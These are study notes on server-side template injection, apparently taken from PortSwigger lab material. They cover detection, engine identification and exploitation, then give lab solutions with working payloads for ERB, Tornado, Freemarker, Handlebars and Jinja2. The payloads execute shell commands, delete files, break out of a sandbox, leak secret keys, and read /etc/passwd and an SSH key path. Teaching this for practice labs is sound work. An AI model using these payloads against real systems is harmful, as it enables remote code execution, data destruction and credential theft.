# Server-side template injection (SSTI)

## **Constructing a server-side template injection attack**

Identifying server-side template injection vulnerabilities and crafting a successful attack typically involves the following high-level process. 

### Detect

As with any vulnerability, the first step towards exploitation is being able to find it. Perhaps the simplest initial approach is to try fuzzing the template by injecting a sequence of special characters commonly used in template expressions, such as `${{<%[%'"}}%\`. If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way. This is one sign that a vulnerability to server-side template injection may 
exist.

        

#### **Plaintext context**

Most template languages allow you to freely input content either by using HTML tags directly or by using the template's native syntax, which will be rendered to HTML on the back-end before the HTTP response is sent. For example, in Freemarker, the line `render('Hello ' + username)` would render to something like `Hello Carlos`.

This can sometimes be exploited for XSS and is in fact often mistaken for a simple XSS vulnerability. However, by setting mathematical operations as the value of the parameter, we can test whether this is also a potential entry point for a server-side template injection attack. 
     

For example, consider a template that contains the following vulnerable code:

`render('Hello ' + username)`

During auditing, we might test for server-side template injection by requesting a URL such as:

`http://vulnerable-website.com/?username=${7*7}`

If the resulting output contains `Hello 49`, this shows that the mathematical operation is being evaluated server-side. This is a good proof of concept for a server-side template injection vulnerability.

Note that the specific syntax required to successfully evaluate the mathematical operation will vary depending on which template engine is being used

#### **Code context**

In other cases, the vulnerability is exposed by user input being placed within a template expression, as we saw earlier with our email example. This may take the form of a user-controllable variable name being placed inside a parameter, such as: 

```jsx
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```

On the website, the resulting URL would be something like: 

`http://vulnerable-website.com/?greeting=data.username`

This would be rendered in the output to `Hello Carlos`, for example.

This context is easily missed during assessment because it doesn't result in obvious XSS and is almost indistinguishable from a simple hashmap lookup. One method of testing for server-side template injection in this context is to first establish that the parameter doesn't contain a direct XSS vulnerability by injecting arbitrary HTML into the value: 

`http://vulnerable-website.com/?greeting=data.username<tag>`

In the absence of XSS, this will usually either result in a blank entry in the output (just `Hello` with no username), encoded tags, or an error message. The next step is to try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it:

`http://vulnerable-website.com/?greeting=data.username}}<tag>`

If this again results in an error or blank output, you have either used syntax from the wrong templating language or, if no template-style syntax appears to be valid, server-side template injection is not possible. Alternatively, if the output is rendered correctly, along with the arbitrary HTML, this is a key indication that a server-side template injection vulnerability is present: 

`Hello Carlos<tag>`

### **Identify**

Once you have detected the template injection potential, the next step is to identify the template engine. 

Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used. 

A common way to identify template is to inject arbitrary mathematical operations using syntax from different template engines. You can then observe whether they are successfully evaluated. To help with this process, you can use a decision tree similar to the following: 

![image.png](Server-side%20template%20injection%20(SSTI)/image.png)

You should be aware that the same payload can sometimes return a successful response in more than one template language. For example, the payload `{{7*'7'}}` returns `49` in Twig and `7777777` in Jinja2. Therefore, it is important not to jump to conclusions based on a single successful response.

Common tags to test for SSTI with code evaluation:

```
{{ ... }}
${ ... }
#{ ... }
<%= ... %>
{ ... }
{{= ... }}
{= ... }
\n= ... \n
*{ ... }
@{ ... }
@( ... )
```

### **Exploit**

After detecting that a potential vulnerability exists and successfully identifying the template engine, you can begin trying to find ways of exploiting it. 

## **Exploiting server-side template injection vulnerabilities**

### **Read**

Unless you already know the template engine inside out, reading its documentation is usually the first place to start. While this may not be the most exciting way to spend your time, it is important not to underestimate what a useful source of information the documentation can be. 

#### Learn the basic template syntax

Learning the basic syntax is obviously important, along with key functions and handling of variables. Even something as simple as learning how to embed native code blocks in the template can sometimes quickly lead to an exploit.

#### **Read about the security implications**

In addition to providing the fundamentals of how to create and use templates, the documentation may also provide some sort of "Security" section. The name of this section will vary, but it will usually outline all the potentially dangerous things that people should avoid doing with the template. This can be an invaluable resource, even acting as a kind of cheat sheet for which behaviors you should look for during auditing, as well as how to exploit them.

Even if there is no dedicated "Security" section, if a particular built-in object or function can pose a security risk, there is almost always a warning of some kind in the documentation. The warning may not provide much detail, but at the very least it should flag this particular built-in as something to investigate.

#### **Look for known exploits**

Another key aspect of exploiting server-side template injection vulnerabilities is being good at finding additional resources online. Once you are able to identify the template engine being used, you should browse the web for any vulnerabilities that others may have already discovered. Due to the widespread use of some of the major template engines, it is sometimes possible to find well-documented exploits that you might be able to tweak to exploit your own target website. 

### **Explore**

At this point, you might have already stumbled across a workable exploit using the documentation. If not, the next step is to explore the environment and try to discover all the objects to which you have access.

Many template engines expose a "self" or "environment" object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine. If such an object exists, you can potentially use it to generate a list of objects that are in scope. For example, in Java-based templating languages, you can sometimes list all variables in the environment using the following injection:

`${T(java.lang.System).getenv()}`

This can form the basis for creating a shortlist of potentially interesting objects and methods to investigate further. Additionally, for Burp Suite Professional users, the Intruder provides a built-in wordlist for brute-forcing variable names. 

#### **Developer-supplied objects**

It is important to note that websites will contain both built-in objects provided by the template and custom, site-specific objects that have been supplied by the web developer. You should pay particular attention to these non-standard objects because they are especially likely to contain sensitive information or exploitable methods. As these objects can vary between different templates within the same website, be aware that you might need to study an object's behavior in the context of each distinct template before you find a way to exploit it. 

While server-side template injection can potentially lead to remote code execution and full takeover of the server, in practice this is not always possible to achieve. However, just because you have ruled out remote code execution, that doesn't necessarily mean there is no potential for a different kind of exploit. You can still leverage server-side template injection vulnerabilities for other high-severity exploits, such as file path traversal, to gain access to sensitive data. 

## Labs

[**Basic server-side template injection**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

```markdown
# Notice "Unfortunately this product is out of stock" error message, while      opening the first product
# Study ERB template documentation and craft the following payload
GET /?message=<%= system('rm /home/carlos/morale.txt') %>
```

[**Basic server-side template injection (code context)**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

```markdown
# Study the Tornado documentation to discover that template expressions are     surrounded with double curly braces, such as {{someExpression}}. In Burp        Repeater, notice that it is possible to escape out of the expression and inject arbitrary template syntax as follows:  
blog-post-author-display=user.name}}{{7*7}}
# Comment on the post and observe that user.name (peter) is displayed alongside the 49
# Craft the following payload
blog-post-author-display=user.nickname}}{%import os%}{{os.system('rm /home/carlos/morale.txt')}}
```

[**Server-side template injection using documentation**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

```markdown
# Edit the post with the SSTI payloads from the intruder predefined wordlist.
# Add grep extraction and note that Freemarker template is being used.
# Search available exploits and craft the following payload
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("rm /home/carlos/morale.txt")}
```

[**Server-side template injection in an unknown language with a documented exploit**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

```markdown
# Notice "Unfortunately this product is out of stock" error message, while      opening the first product
# Put {{7*7}} payload into the parameter and notice that Node.js handlebars template is being used
# Craft and URL Encode following payload
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

```

[**Server-side template injection with information disclosure via user-supplied objects**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

```markdown
# Edit the post with the SSTI payloads from the intruder predefined wordlist.
# Add grep extraction and note that Python Django/Jinja2 template is being used.
# Search exploits and craft the following payload, which leak a SECRET KEY
{{settings.SECRET_KEY}}
```

[**Server-side template injection in a sandboxed environment**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

```markdown
# Edit the post with the SSTI payloads from the intruder predefined wordlist.
# Add grep extraction and note that java Freemarker template is being used.
# Search sandbox payloads and craft the following:
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

[**Server-side template injection with a custom exploit**](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)

```markdown
# Notice that the functionality for setting a preferred name is vulnerable to   SSTI, leading to access user object
# Notice that when you upload an invalid image, the error message discloses a method called user.setAvatar()
# Request for changing your preferred name to set an arbitrary file as avatar: 
blog-post-author-display=user.setAvatar('/etc/passwd','image/jpg')
# load the avatar using GET /avatar?avatar=wiener, which will return the contet of the /etc/passwd file
# Repeat this process to read the PHP file - /home/carlos/User.php that disclosured in the error message earlier
blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpg')
# In the PHP file, Notice that the gdprDelete() function, which deletes the     user's avatar
# Set the target file as your avatar, then view the comment to execute the      template
blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')
# Invoke the user.gdprDelete() method
```